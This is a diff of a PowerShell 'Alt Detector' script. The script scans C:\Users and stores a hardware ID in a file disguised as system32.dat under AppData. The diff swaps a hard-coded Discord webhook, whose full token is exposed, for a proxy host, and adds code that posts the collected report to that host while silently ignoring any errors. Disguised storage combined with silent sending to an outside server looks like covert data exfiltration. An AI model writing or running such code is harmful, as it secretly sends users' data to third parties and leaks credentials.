@@ -1,4 +1,5 @@
-$webhookUrl = "https://discord.com/api/webhooks/1485035447221616791/OIIiXNb7gCbY0BbMmJ6w1WkrWIwiSXwX8n19rqkKFyYnHB218j8WT9Cpd7eC1qMomEDF"
+$proxyUrl = "https://heatedmoments.pythonanywhere.com"
+
 $startPath = "C:\Users"
 $hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
 $hwidFile = "$hwidFolder\system32.dat"
@@ -158,8 +159,21 @@ $embed = @{
     timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
 }
 
-$payload = @{ embeds = @($embed); username = "Alt Detector" } | ConvertTo-Json -Depth 3
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+$payload = @{ 
+    embeds = @($embed)
+    username = "Alt Detector"
+} | ConvertTo-Json -Depth 3
+
+$body = @{
+    payload = $payload
+} | ConvertTo-Json
+
+try {
+    Invoke-RestMethod -Uri $proxyUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+}
+catch {
+    # Silently ignore errors
+}
 
 Write-Host "`n========================================" -ForegroundColor Cyan
 Write-Host "ALT DETECTION COMPLETE" -ForegroundColor Cyan
